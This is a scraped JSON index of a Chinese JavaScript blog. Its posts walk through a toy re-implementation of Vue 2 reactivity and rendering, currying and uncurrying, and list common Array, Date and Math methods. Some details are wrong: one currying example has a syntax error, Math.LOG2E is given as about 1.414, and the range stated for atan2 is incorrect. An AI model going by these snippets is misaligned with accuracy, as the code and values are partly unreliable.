Vue源码解读-响应式","date":"2020-12-18T09:40:59.000Z","path":"2020/12/18/vue-template-responsive/","text":"响应式原理 我们在使用 Vue 的时候，复制属性获得属性都是直接使用Vue实例 我们在设计属性值的时候，页面数据更新 Object.defineProperty(obj, key, &#123;&#125;)123456789101112// 注意 value 和 writable 不可以和 get set 连用Object.defineProperty(obj, key, &#123; enumerable: !!enumerable, configurable: true, set (newValue)&#123; value = newValue &#125;, get()&#123; console.log(value) return value &#125;&#125;) 使用 Object.defineProperty() 实现数据监控 123456789101112131415161718192021222324252627282930313233343536373839404142const data = &#123; name: &#x27;优·库里伍德·海尔赛兹&#x27;, behavior: &#x27;吃橘子&#x27;, like: [ &#123;juice: &#x27;juice&#x27;&#125; ], other: &#123; name: &#x27;相川步&#x27;, behavior: &#123; name: &#x27;约的人&#x27;, time: &#x27;12m&#x27; &#125; &#125;&#125;function setPerperties(obj, key, value, enumerable) &#123; console.log(obj, key, value, !!enumerable) Object.defineProperty(obj, key, &#123; enumerable: !!enumerable, configurable: true, set (newValue)&#123; value = newValue &#125;, get()&#123; console.log(value) return value &#125; &#125;)&#125;function setReactive(o) &#123; Object.keys(o).map(key =&gt; &#123; if(Object.prototype.toString.call(o[key]) === &#x27;[object Object]&#x27;) &#123; setReactive(o[key]) &#125; else if(Object.prototype.toString.call(o[key]) === &#x27;[object Array]&#x27;) &#123; o[key].map(item =&gt; &#123; if(Object.prototype.toString.call(item) === &#x27;[object Object]&#x27; || Object.prototype.toString.call(item) === &#x27;[object Array]&#x27;) setReactive(item) &#125;) &#125; else &#123; setPerperties(o, key, o[key], true) &#125; &#125;)&#125;setReactive(data) 针对数组中的特殊方法进行响应式化处理 push 向数组的最后添加元素，并返回新的数组长度 unshift 向数组的开始添加元素，并返回新的数组长度 pop 删除数组的最后一个元素，并返回被删除的元素 shift 删除数组的第一个元素，并返回被删除的元素 reverse 翻转数组，并返回翻转之后的数组 sort 数组排序 splice 向/从数组中添加/删除项目，然后返回被删除的项目，rrayObject.splice(index,howmany,item1,…..,itemX) (删除的位置, 删除的个数， 插入的新元素) vue2 中数组发生变化，设置 length 没法通知（Vue3 中使用Proxy语法解决了这个问题） 加进来的元素也应该是响应式的 技巧：如果一个函数已经定义了，但是我们需要扩展其功能，我们一般的处理方法 使用一个临时的函数名存储函数 重新定义原来的函数 定义扩展的功能 调用临时的那个函数12345678910111213function func() &#123; console.log(&#x27;old property&#x27;)&#125;// 第一步let _tempFn = func// 第二步func = function() &#123; // 第四步 _tempFn() // 第三步 console.log(&#x27;new property&#x27;)&#125;func() 如何修改数组的扩展函数 不能直接修改数组的 prototype 修改要进行响应式化的数组的原型(proto) 原型式继承：修改原型链结构 继承关系： arr -&gt; Array.prototype -&gt; Object.prototype -&gt; … 修改之后： arr -&gt; 改写的方法 -&gt; Array.prototype -&gt; Object.prototype -&gt; …12345678910111213141516let arr = []let ARRAY_METHOD = [&#x27;pop&#x27;, &#x27;unshift&#x27;, &#x27;push&#x27;, &#x27;shift&#x27;, &#x27;reverse&#x27;, &#x27;sort&#x27;, &#x27;splice&#x27;]let arrayMethods = Object.create(Array.prototype)ARRAY_METHOD.map(item =&gt; &#123; arrayMethods[item] = function() &#123; Array.from(arguments).map(item =&gt; &#123; setReactive(item) &#125;) // 在这里对数据进行响应式化 let res = Array.prototype[item].apply(this, arguments) return res &#125;&#125;)arr.__proto__ = arrayMethods vue做了兼容，如果浏览器兼容proto，就使用 原型式继承 不兼容就使用 混入法 将方法一个个的加入到 arr 中 将方法整合到设置响应式方法中 123456789101112131415function setReactive(o) &#123; Object.keys(o).map(key =&gt; &#123; if(Object.prototype.toString.call(o[key]) === &#x27;[object Object]&#x27;) &#123; setReactive(o[key]) &#125; else if(Object.prototype.toString.call(o[key]) === &#x27;[object Array]&#x27;) &#123; console.log(o[key]) o[key].__proto__ = arrayMethods // 拦截数组，进行数组响应式 o[key].map(item =&gt; &#123; if(Object.prototype.toString.call(item) === &#x27;[object Object]&#x27; || Object.prototype.toString.call(item) === &#x27;[object Array]&#x27;) setReactive(item) &#125;) &#125; else &#123; setPerperties(o, key, o[key], true) &#125; &#125;)&#125; 对 对象 或者 数组 重新赋值 如何设置响应式 setPerperties() 函数的set方法中 重新调用一次 setReactive() 变更页面 在 JGVue 函数中调用 setReactive 方法 把 this._data 设置成响应式类型，同时传递 vue 实例到 Object.defineProperty 123456function JGVue(options) &#123; this._data = options.data setReactive(this._data, this) this._template = document.querySelector(options.el) // vue 中这里是DOM this.mount() // 挂载&#125; 修改 setReactive 方法 1234567891011121314function setReactive(o, vm) &#123; Object.keys(o).map(key =&gt; &#123; if(Object.prototype.toString.call(o[key]) === &#x27;[object Object]&#x27;) &#123; setReactive(o[key], vm) &#125; else if(Object.prototype.toString.call(o[key]) === &#x27;[object Array]&#x27;) &#123; o[key].__proto__ = arrayMethods // 拦截数组，进行数组响应式 o[key].map(item =&gt; &#123; if(Object.prototype.toString.call(item) === &#x27;[object Object]&#x27; || Object.prototype.toString.call(item) === &#x27;[object Array]&#x27;) setReactive(item, vm) &#125;) &#125; else &#123; setPerperties.call(vm, o, key, o[key], true) &#125; &#125;)&#125; 修改 setPerperties 函数 1234567891011121314function setPerperties(obj, key, value, enumerable) &#123; let _that = this Object.defineProperty(obj, key, &#123; enumerable: !!enumerable, configurable: true, set (newValue)&#123; value = newValue _that.mountComponent() &#125;, get()&#123; return value &#125; &#125;)&#125;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"}]},{"title":"02 - Vue源码解读-渲染模型","date":"2020-12-17T07:01:25.000Z","path":"2020/12/17/vue-template-render/","text":"判断元素 vue 本质上是使用 HTML 字符串作为模板，将字符串模板转化为 AST(抽象语法树) ,再转换成 VNode 模板 -&gt; AST AST -&gt; VNode VNode -&gt; DOM 最消耗性能的是字符串解析(模板 -&gt; AST) 小例子： let s = “1 + 2 (3 + 4 (5 + 6))” 得到结果建议：将字符串表达式转化为波兰式表达式，使用栈结构来运算 1 vue源码如何区分HTML标签和自定义组件? vue源码把所有可用的HTML标签都存起来 使用柯里化操作将需要遍历的 HTML 标签存储起来 1234567891011121314function makeMap(keys) &#123; const obj = Object.create(null) keys.map(item =&gt; &#123; obj[item] = true return item &#125;) return function(key) &#123; return !!obj[key] &#125;&#125;let htmlkey = [&#x27;p&#x27;,&#x27;div&#x27;,&#x27;a&#x27;,&#x27;ul&#x27;,&#x27;li&#x27;,&#x27;ol&#x27;,&#x27;dl&#x27;]const htmlMap = makeMap(htmlkey)htmlMap(&#x27;div&#x27;) // truehtmlMap(&#x27;img&#x27;) // false 函数柯里化 虚拟 DOM 的 render 方法 vue项目 模板转化为抽象语法树 页面一开始加载需要渲染 每一个属性(响应式)数据在发生变化时要渲染 watch，computed每次需要渲染的时候，模板就会被解析一次 render 的作用是将虚拟DOM 转化为真正的DOM 虚拟DOM 可以降级理解为AST 一个项目运行的时候，模板是不会变得，就表示AST是不会变得 将虚拟DOM 缓存起来，生成一个函数，只需要传入参数，就可以的到真正的DOM123456789101112&lt;div id=&quot;app&quot;&gt; &lt;div&gt; &lt;div&gt; &#123;&#123;name&#125;&#125; &#123;&#123;behavior&#125;&#125; &lt;/div&gt; &lt;div&gt; &#123;&#123;other.name&#125;&#125; &#123;&#123;other.behavior.name&#125;&#125; &#123;&#123;other.behavior.time&#125;&#125; &lt;/div&gt; &lt;/div&gt; &lt;p&gt;人员：&#123;&#123;name&#125;&#125;&lt;/p&gt; &lt;p&gt;行为：&#123;&#123;behavior&#125;&#125;&lt;/p&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173function JGVue(options) &#123; this._data = options.data this._template = document.querySelector(options.el) // vue 中这里是DOM this.mount() // 挂载&#125;JGVue.prototype.mount = function() &#123; // 需要提供一个render方法生成虚拟dom this.render = this.createRenderFn() this.mountComponent()&#125;JGVue.prototype.mountComponent = function() &#123; // 执行mountComponent let mount = () =&gt; &#123; // 调用update方法渲染dom this.update(this.render()) &#125; mount.call(this) // 本质上应该交给watcher来调用，此操作并不会改变this的指向&#125;/* * 在真正的 vue 中使用了 二次提交的设计结构 * 1 在页面中 DOM 和虚拟 DOM 是一一对应的关系 * 数据发生变化的时候，就会通过 diff 方法 对比需要更新的虚拟 DOM 节点，更新 DOM * 凡是解析就会涉及到 AST * 2 现有AST和数据生成VNode * 3 将新的VNode 和旧的 VNode 比较(diff)更新(update)*/// 生成render 函数，缓存抽象语法树（使用虚拟DOM来模拟）JGVue.prototype.createRenderFn = function() &#123; // 获取抽象语法树 let ast = getVnode(this._template) console.log(ast) // Vue: 将AST + data =&gt; VNode return function render() &#123; // 将带坑的VNode (ast) 转化为真正的带数据的VNode let _temp = combine(ast, this._data) console.log(_temp) return _temp &#125;&#125;// 将虚拟DOM渲染到页面中 diff算法就在这里JGVue.prototype.update = function(data) &#123; let dom = parseVnode(data) let app = document.getElementById(&quot;app&quot;) let parent = app.parentNode parent.replaceChild(dom, app)&#125;// node 为页面中真实的 DOM 节点// 使用递归的方法提取出 DOM 节点中所有的子孙节点// Vue源码中使用 栈 的方式// 由HTML DOM -&gt; VNode， 将这个函数当做compiler函数function getVnode(node) &#123; let nodeType = node.nodeType let _vnode = null // 判断nodeType类型 if(nodeType === 1) &#123; // 元素节点 let nodeName = node.nodeName // 获取 node 元素的 所有 attribute 属性， 是一个伪数组，需要转换成 对象 let attrs = node.attributes let _attrs = Object.create(null) for(let i = 0; i &lt; attrs.length; i++) &#123; _attrs[attrs[i].nodeName] = attrs[i].nodeValue &#125; _vnode = new VNode(nodeName, _attrs, undefined, nodeType) // 然后处理元素节点的所有自节点 let childNodes = node.childNodes for(let i = 0; i &lt; childNodes.length; i++) &#123; _vnode.appendCild(getVnode(childNodes[i])) &#125; &#125; else if(nodeType === 3) &#123; // 文本节点 // 文本节点没有 tag 属性 data属性 _vnode = new VNode(undefined, undefined, node.nodeValue, nodeType) &#125; return _vnode&#125;// 将带有‘&#123;&#123;&#125;&#125;’的虚拟DOM和传入的data数据结合起来，生成带有数据的DOM树function combine(node, data) &#123; let _type = node.type let _data = node.data let _value = node.value let _tag = node.tag let _children = node.children let _vnode = null // 判断nodeType类型 if(_type === 1) &#123; // 元素节点 _vnode = new VNode(_tag, _data, _value, _type) // 然后处理元素节点的所有自节点 _children.map(item =&gt; _vnode.children.push(combine(item, data))) &#125; else if(_type === 3) &#123; // 文本节点 _value = _value.replace(curlyRE, (_, g) =&gt; &#123; /* * 第一个参数是正则表达式匹配到的东西 * 第二个参数及以后是第 n-1 个分组 */ const split = createSplitAttribute(g.trim()) return split(data) &#125;); // 文本节点没有 tag 属性 data属性 _vnode = new VNode(_tag, _data, _value, _type) &#125; return _vnode&#125;// 将虚拟dom 转化为真实DOMfunction parseVnode(vnode) &#123; const &#123;tag, data, type, value, children&#125; = vnode let dom = null if(type === 1) &#123; dom = document.createElement(tag) for(let key in data) &#123; dom.setAttribute(key, data[key]) &#125; dom.nodeType = type for(let i = 0; i &lt; children.length; i++) &#123; dom.appendChild(parseVnode(children[i])) &#125; &#125; else if(type === 3) &#123; dom = document.createTextNode(tag) dom.nodeValue = value dom.nodeType = type &#125; return dom&#125;// 使用柯里化 存储需要替换的内容function createSplitAttribute(g) &#123; let paths = g.split(&#x27;.&#x27;) return function splitAttribute(data) &#123; let res = data // g.split(&#x27;.&#x27;).map(item =&gt; &#123; // res = res[item] // &#125;) //2. let prop while(prop = paths.shift()) &#123; // 当对一个变量赋值对象时，是对象的引用，变量中的某个值发生变化，对象中对应的值也会发生变化 // 但是给变量重新赋值对象，并不会造成原先对象的值发生变化，因为此时变量的引用已经发生变化，不在指向源对象 console.log(res, prop) res = res[prop] &#125; return res &#125;&#125;const options = &#123; el: &#x27;#app&#x27;, data: &#123; name: &#x27;优·库里伍德·海尔赛兹&#x27;, behavior: &#x27;吃橘子&#x27;, other: &#123; name: &#x27;相川步&#x27;, behavior: &#123; name: &#x27;约的人&#x27;, time: &#x27;12m&#x27; &#125; &#125; &#125;&#125;const curlyRE = /\\&#123;\\&#123;(.+?)\\&#125;\\&#125;/gclass VNode &#123; /* * tag: node.nodeValue * data: node.attributes =&gt; obj =&gt; &#123;node.attribute.nodeName: node.attribute.nodeValue&#125; */ constructor(tag, data, value, type) &#123; this.tag = tag &amp;&amp; tag.toLowerCase() this.data = data this.value = value this.type = type this.children = [] &#125; appendCild(vnode) &#123; this.children.push(vnode) &#125;&#125;let app = new JGVue(options)","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"}]},{"title":"函数 - 函数反柯里化（uncurrying）","date":"2020-12-17T03:00:35.000Z","path":"2020/12/17/fucntion-uncurrying/","text":"参考链接 函数柯里化 含义 柯里化：是固定部分参数,返回一个接受剩余参数的函数,也称为部分计算函数,目的是为了缩小适用范围，创建一个针对性更强的函数，核心思想是把多参数传入的函数拆成单(部分)参数函数，内部再返回下一个单(部分)参数函数，依次处理剩余函数 反柯里化：扩大适用范围，创建一个应用范围更广的函数，使本来只有特定对象才适用的方法，扩展到更多对象 通用实现 12345678910111213141516171819202122232425// 第一种实现方式Function.prototype.unCurrying = function() &#123; const self = this // ...rest 方法相当于使用es6语法的解构赋值使用rest接收入参数组，相当于arguments rest的值是传入的所有参数组成的一个数组 return function(...rest) &#123; return Function.prototype.call.apply(self, rest) &#125;&#125;const push = Array.prototype.push.unCurrying()/* * 1 为 Function 原型添加 unCurrying 方法，并在执行的时候保存执行 unCurrying 的方法到self * 2 借用apply把要借用的函数作为this环境赋予call，并传入之后的形参作为参数执行*/// 第二种实现方式Function.prototype.unCurrying = function() &#123; return this.call.bind(this)&#125;// 第三种实现方式function unCurrying(fn) &#123; return function(tar, ...argu) &#123; return fn.apply(tar, argu) &#125;&#125; 使用反柯里化 1234567891011121314Function.prototype.unCurrying = function() &#123; const self = this return function(...rest) &#123; console.log(rest, &#x27;uncurrying rest&#x27;) return Function.prototype.call.apply(self, rest) &#125;&#125;const push = Array.prototype.push.unCurrying()~function(...rest) &#123; console.log(rest, &#x27;before&#x27;) push(rest, 4, 5) console.log(rest, &#x27;after&#x27;)&#125;(1,2,3) 反柯里化其实反映的是一种思想 - 扩大方法的适用范围 12345678910111213141516Function.prototype.unCurrying = function() &#123; const self = this return function(...rest) &#123; console.log(rest, &#x27;uncurrying rest&#x27;) return Function.prototype.call.apply(self, rest) // Array.prototype.push.call(&#123;a: 3&#125;, 4, 5) &#125;&#125;const push = Array.prototype.push.unCurrying()~function() &#123; let rest = &#123;a: 3&#125; console.log(rest, &#x27;before&#x27;) push(rest, 4, 5) console.log(rest, &#x27;after&#x27;)&#125;(1,2,3) 只要是方法就可以借用 unCurrying 方法 123456789101112131415161718192021222324252627282930313233343536373839 // call var call = Function.prototype.call.unCurrying() function $(id) &#123; return this.getElementById(id) &#125; // call() call($, document, &#x27;demon&#x27;) /* * 解题步骤 * =&gt; Function.prototype.call.apply(Function.prototype.call, [$, document, &#x27;demon&#x27;]) * =&gt; Function.prototype.call.call($, document, &#x27;demon&#x27;) * =&gt; $.call(document, &#x27;demon&#x27;) * =&gt; document.getElementById(&#x27;demon) */ // unCurrying 借用自己本身 const unCurrying = Function.prototype.unCurrying.unCurrying() const map = unCurrying(Array.prototype.map) map(&#123;0: 4, 1: &#x27;a&#x27;, 2: null, length: 3&#125;, n =&gt; n + n) /* * const map = unCurrying(Array.prototype.map) 步骤 * =&gt; Function.prototype.call.apply(Function.prototype.unCurrying, [Array.prototype.map]) * =&gt; Function.prototype.unCurrying.call(Array.prototype.map) * =&gt; Array.prototype.map.unCurrying() * =&gt; map = Array.prototype.map.unCurrying() * =&gt; map(&#123;0: 4, 1: &#x27;a&#x27;, 2: null, length: 3&#125;, n =&gt; n + n) * =&gt; Function.prototype.call.apply(Array.prototype.map, [&#123;0: 4, 1: &#x27;a&#x27;, 2: null, length: 3&#125;, n =&gt; n + n]) * =&gt; Array.prototype.map.call(&#123;0: 4, 1: &#x27;a&#x27;, 2: null, length: 3&#125;, n =&gt; n + n) * =&gt; &#123;0: 4, 1: &#x27;a&#x27;, 2: null, length: 3&#125;.map(n =&gt; n + n) * =&gt; &#123;0: 8, 1: &#x27;aa&#x27;, 2: 0, length: 3&#125; */ ~~~~#### 总结 函数柯里化 ~~~js function(arg1, arg2) // function(arg1)(arg2) function(arg1, arg2, arg3) // function(arg1)(arg2)(arg3) function(arg1, arg2, arg3, arg4) // function(arg1)(arg2)(arg3)(arg4) 反柯里化 1obj.fn(arg1, arg2) // fn(obj, arg1, arg2) 终点知识解析 Function.prototype.call.apply(self, rest) 小例子： 1Math.Max.apply([], [1, 2, 3]) 先执行 apply 将 math 替换成 []然后在执行 Max 并传入[1,2,3],此时因为 apply 的关系 [1,2,3]扁平化为1,2,3 Function.prototype.call.apply(self, rest)过程 Function.prototype.call.apply(Array.prototype.push, rest) Array.prototype.push.call(...rest) 所以在传递 rest 的时候，需要操作的对象放在第一位，方便 call 绑定 this rest[0].push(rest.shift(1)) 123456var obj = &#123;a: 3&#125;Array.prototype.push.call(obj, 4, 5) // 2obj // &#123;0: 4, 1: 5, a: 3, length: 2&#125;var obj = &#123;a: 3, b: 3&#125;Array.prototype.push.call(obj, 4, 5) // 2obj //&#123;0: 4, 1: 5, a: 3, b: 3, length: 2&#125;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"thought","slug":"thought","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/thought/"},{"name":"function","slug":"function","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/function/"}]},{"title":"函数 - 函数柯里化（Currying）","date":"2020-12-17T01:16:37.000Z","path":"2020/12/17/function-currying/","text":"参考文章 函数反柯里化 函数柯里化其实本身是固定一个可以预期的参数，并返回一个特定的函数，处理批特定的需求，增加了函数的适用性，降低了函数的适用范围 柯里化函数通用实现 1234567891011function currying(fn) &#123; var slice = Array.prototype.slice, // 取出传入的多个参数(不包含第一位) _args = slice.call(arguments, 1) return function() &#123; var _inargs = slice.call(arguments) // 将创建柯里化函数传入的参数与后传入的参数进行合并 return fn.apply(null, _args.concat(_inargs)) &#125;&#125; 提高适用性 解决了兼容性问题，但同时也会再来，使用的不便利性，不同的应用场景往，要传递很多参数，以达到解决特定问题的目的。有时候应用中，同一种规则可能会反复使用，这就可能会造成代码的重复性。 123456789101112131415161718192021function square(i) &#123; return i * i;&#125;function dubble(i) &#123; return i *= 2;&#125;function map(handeler, list) &#123; return list.map(handeler);&#125;var mapSQ = currying(map, square);mapSQ([1, 2, 3, 4, 5]);mapSQ([6, 7, 8, 9, 10]);mapSQ([10, 20, 30, 40, 50]);var mapDB = currying(map, dubble);mapDB([1, 2, 3, 4, 5]);mapDB([6, 7, 8, 9, 10]);mapDB([10, 20, 30, 40, 50]); 缩小了函数的适用范围，但同时提高函数的适性 12345678910111213141516171819202122232425262728function Ajax() &#123; this.xhr = new XMLHttpRequest();&#125;Ajax.prototype.open = function(type, url, data, callback) &#123; this.onload = function() &#123; callback(this.xhr.responseText, this.xhr.status, this.xhr); &#125; this.xhr.open(type, url, data.async); this.xhr.send(data.paras);&#125;&#x27;get post&#x27;.split(&#x27; &#x27;).forEach(function(mt) &#123; Ajax.prototype[mt] = currying(Ajax.prototype.open, mt);&#125;);var xhr = new Ajax();xhr.get(&#x27;/articles/list.php&#x27;, &#123;&#125;,function(datas) &#123; // done(datas) &#125;);var xhr1 = new Ajax();xhr1.post(&#x27;/articles/add.php&#x27;, &#123;&#125;,function(datas) &#123; // done(datas) &#125;); 延迟执行 不断地柯里化，累计传入的参数，最后执行 12345678910111213141516171819202122232425262728293031var add = function() &#123; var _this = this, _args = arguments return function() &#123; if (!arguments.length) &#123; var sum = 0; for (var i = 0, i&lt; _args.length; i++ &#123; sum += _args[i] &#125; return sum &#125; else &#123; // 通过函数的push方法，存储每一次调用的返回参数到 _args 中 Array.prototype.push.apply(_args, arguments) // arguments.callee 返回的是arguments所在函数本身，此操作相当于return return arguments.callee &#125; &#125;&#125;add(1)(2)(3)(4)();//10// 通用的写法var curry = function(fn) &#123; var _args = [] return function cb() &#123; if (arguments.length == 0) &#123; return fn.apply(this, _args) &#125; Array.prototype.push.apply(_args, arguments); return cb; &#125;&#125; 固定异变因素 提前把易变因素，传参固定下来，生成一个更明确的应用函数。最典型的代表应用，是bind函数用以固定this这个易变对象。 123456789Function.prototype.bind = function(context) &#123; var _this = this, _args = Array.prototype.slice.call(arguments, 1); // arguments [this, arg1, arg2 ...] return function() &#123; // 绑定 this 到创建柯里化函数时绑定的this，同时合并参数 return _this.apply(context, _args.concat(Array.prototype.slice.call(arguments))) &#125;&#125;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"thought","slug":"thought","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/thought/"},{"name":"function","slug":"function","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/function/"}]},{"title":"javascript-data-methods","date":"2020-12-16T05:59:28.000Z","path":"2020/12/16/javascript-data-methods/","text":"全局函数（function） decodeURI() 解码某个编码的URI encodeURI() 把字符串编码为URI decodeURIComponent() 解码一个编码的URI组件 encodeURIComponent() 把字符串编码为URI组件 escape() 对字符串进行编码 eval() 计算javascript字符串并把它作为脚本来执行 isFinite() 检查某个值是否为有穷大的数 isNaN() 检查某个值是否是数字 Number() 把对象的值转化为数字 parseFloat() 解析一个字符串并返回一个浮点数 parseInt() 解析一个字符串并返回一个整数 String() 把对象的值转为字符串 unescape() 对由escape()编码的字符串进行解码 数组（Array） concat() 连接两个或者更多的数组，并返回结果 copyWithin(target, start, end) 将数组的指定位置拷贝元素到数组的另一个指定位置中 （target 指的是元素复制的位数， start指的是元素开始复制的位置，end指的是元素结束复制的位数） entries() 返回一个数组的迭代对象，包含数组的键值对[index, vlaue] every() 检测数组元素的每个元素是否符合条件，如果都满足条件， 返回true，如果不满足返回false some() 检测数值中某个元素是否符合条件，如果有一个符合，返回true，如果全不符合，返回false fill() 使用一个固定值来填充数组 filter() 用于筛选数组，返回符合条件的一个新的数组 find() 返回符合传入测试的数组元素 findIndex() 返回符合传入测试数组元素的索引 forEach() 数组的每一个元素都执行一次回调函数 map() 循环遍历数组中的每一个值，可以用于修改数组 from() Array.from() 通过给定的对象创建一个数组 indexOf() 搜索数组中国的元素，并返回所在位置 includes() 判断一个数组是否包含一个指定的值 isArray() 判断对象是否是数组 join() 把数组中的元素以某个标识拼接为字符串 keys() 返回数组的可迭代对象，包含原始数组的键(key) lastIndexOf() 搜索数组中的元素，并返回它最后出现的位置 pop() 删除数组中的最后一个元素，并返回删除的元素 push() 向数组的末尾添加一个或多个元素，并返回新的长度 reduce() 计算元素，可以用于计算数组，筛选，遍历，从左到右 reduceRight() 计算元素，可以用于计算数组，筛选，遍历，从右到左 reverse() 反转数组的元素顺序 shift() 删除并返回数组的第一个元素 slice(start, end) 选取数组的一部分，并选取一个新数组 sort() 对元素数组进行排序， 可以自定义排序规则 splice(index, many, item) 从数组中添加和删除元素 toString() 将数组转化为字符串，并返回结果 unshift() 向数组开头添加一个或多个元素，并返回新的长度 valueOf() 返回数组对象的原始值 时间对象（Date）方法* date.Date() 返回当日的日期和事件 * date.getDate() 从Date对象中返回一个月的某一天 * date.getDay() 从Date对象中返回一周中的某一天 * Date.getMonth() 返回Date对象的月份（0-11）真实月份需要加 * date.getFullYear() 返回四位数字的年份 * date.getYear() 返回两位数字的年份 * date.getHours() 返回对象的小时数 * date.getMinutes() 返回对象的分钟数 * date.getSeconds() 返回对象的秒数 * date.getMilliseconds() 返回对象的毫秒数 * date.getTime() 返回1970年1月1日至今的毫秒数 * date.getUTCDate() 从Date对象中返回世界时一个月的某一天 * date.getUTCDay() 从Date对象中返回世界时一周中的某一天 * date.getUTCMonth() 返回Date对象的世界时月份（0-11）真实月份需要加 * date.getUTCFullYear() 返回世界时四位数字的年份 * date.getUTCYear() 返回世界时两位数字的年份 * date.getUTCHours() 返回对象世界时的小时数 * date.getUTCMinutes() 返回对象世界时的分钟数 * date.getUTCSeconds() 返回对象世界时的秒数 * date.getUTCMilliseconds() 返回对象世界时的毫秒数 * date.parse() 获取1970年1月1日午夜到制定日期（字符串）的毫秒数 * date.setDate() 设置某一天 * date.setFullYear() 设置Date对象的年份 * date.setMonth() 设置月份 * date.setHours() 设置日期的小时 * date.setMillisecoends() 设置毫秒数 * date.setTime() 以毫秒设置date对象 * date.setMinutes() 设置分钟 * date.setSeconds() 设置秒 * date.toDateString() 把对象的日期部分转化为字符串 * date.toJSON() 以json数据格式返回日期字符串 * date.toLocaleDateString() 根据本地时间格式，把Date对象的日期部分转为字符串 * date.toLocaleTimeString() 根据本地时间格式，把Date对象的日期部分转为字符串 * date.toLocaleString() 根据本地时间格式，把Date对象转为字符串 * date.valueOf() 返回date对象的原始值 简单的时间函数* 获取当前日期 12345678910111213141516171819202122232425262728293031323334// 以年月日格式获取时间getNewDate() &#123; var date = new Date() date.setTime(date.getTime())// 获取上个月的日期（这一行去掉就是获取今天计算机上的日期了） var now = date var year = now.getFullYear() // 年 var month = now.getMonth() + 1 // 月 var day = now.getDate() // 日 var clock = year + &#x27;-&#x27; if (month &lt; 10) &#123; clock += &#x27;0&#x27; &#125; clock += month + &#x27;-&#x27; if (day &lt; 10) &#123; clock += &#x27;0&#x27; &#125; clock += day return clock&#125;// 以年月日 时分秒获取时间// fmt 为传入的日期格式 // yyyy-MM-dd hh:mm:ss 年月日 时分秒// yyyy-MM-dd 年月日getNowTime(fmt) &#123; var date = new Date() var o = &#123; &#x27;M+&#x27;: date.getMonth() + 1, // 月份 &#x27;d+&#x27;: date.getDate(), // 日 &#x27;h+&#x27;: date.getHours(), // 小时 &#x27;m+&#x27;: date.getMinutes(), // 分 &#x27;s+&#x27;: date.getSeconds(), // 秒 &#x27;q+&#x27;: Math.floor((date.getMonth() + 3) / 3), // 季度 &#x27;S&#x27;: date.getMilliseconds() // 毫秒 &#125; if (/(y+)/.test(fmt)) &#123; fmt = fmt.replace(RegExp.$1, (date.getFullYear() + &#x27;&#x27;).substr(4 - RegExp.$1.length)) &#125; for (var k in o) &#123; if (new RegExp(&#x27;(&#x27; + k + &#x27;)&#x27;).test(fmt)) fmt = fmt.replace(RegExp.$1, (RegExp.$1.length === 1) ? (o[k]) : ((&#x27;00&#x27; + o[k]).substr((&#x27;&#x27; + o[k]).length))) &#125; return fmt&#125; * 获取当前日期之前或者之后一段时间的日期 123456// 通过setTime将时间设置为当前时间100分钟之后，然后获取设置之后的时间getTime() &#123; var date = new Date() date.setTime(date.getTime + 1000 * 60 * 100) var newDate = date.getFullYear() + &#x27;-&#x27; + (Number(date.getMonth()) + 1) + &#x27;-&#x27; + date.getDate() + &#x27; &#x27; + date.getHours() + &#x27;:&#x27; + date.getMinutes() + &#x27;:&#x27; + date.getSeconds()&#125; * 比较两个时间的大小 1234567891011// 比较传入的时间大小 时间格式为 yyyy-MM-dd hh:mm:ss// 通过date.parse()获取传入时间的毫秒数， 通过new Date() 转化为日期格式，在进行大小比较Compare(time1, time2) &#123; const date1 = new Date(Date.parse(time1.replace(/-/g, &#x27;/&#x27;))) const date2 = new Date(Date.parse(time2.replace(/-/g, &#x27;/&#x27;))) if (date1 &gt; date2) &#123; return &#x27;时间1 大于 时间2&#x27; &#125; else &#123; return &#x27;时间2 大于 时间1&#x27; &#125;&#125; * 计算所选时间是第几周(当前月第几周，当前年份第几周) 12345678910111213141516171819202122getYearWeek(year,month,date)&#123; /* dateNow是当前日期 dateFirst是当年第一天 dataNumber是当前日期是今年第多少天 用dataNumber + 当前年的第一天的周差距的和在除以7就是本年第几周 */ let dateNow = new Date(year, parseInt(month) - 1, date); let dateFirst = new Date(year, 0, 1); let dataNumber = Math.round((dateNow.valueOf() - dateFirst.valueOf()) / 86400000); return Math.ceil((dataNumber + ((dateFirst.getDay() + 1) - 1)) / 7); &#125;getMonthWeek(year,month,date)&#123; /* month = 6 - w = 当前周的还有几天过完(不算今天) year + month 的和在除以7 就是当天是当前月份的第几周 */ let dateNow = new Date(year, parseInt(month) - 1, date); let w = dateNow.getDay();//星期数 let d = dateNow.getDate(); return Math.ceil((d + 6 - w) / 7); &#125; 数学对象（Math） Math.E 返回算术常亮e，即自然对数的底数（约等于2.718） Math.LN2 返回2的自然对数（约等于0.693） Math.LEN10 返回10的自然对数（约等于2.302） Math.LOG2E 返回以2为底的e的对数（约等于1.414） Math.LOG10E 返回以10为底的e的对数（约等于0.434） Math.PI 返回圆周率（约等于3.14159） Math.SQRT1_2 返回 2 的平方根的倒数（约等于 0.707） Math.SQRT2 返回 2 的平方根（约等于 1.414） Math.abs() 返回数的绝对值 Math.acos() 返回数的反余弦值 Math.asin() 返回数的反正弦值 Math.atan() 以介于 -PI/2 与 PI/2 弧度之间的数值来返回 x 的反正切值 Math.atan2(y,x) 返回从 x 轴到点 (x,y) 的角度（介于 -PI/2 与 PI/2 弧度之间） Math.ceil() 向上取整 Math.cos() 返回余弦值 Math.exp() 返回e的指数 Math.floor() 向下取整 Math.log() 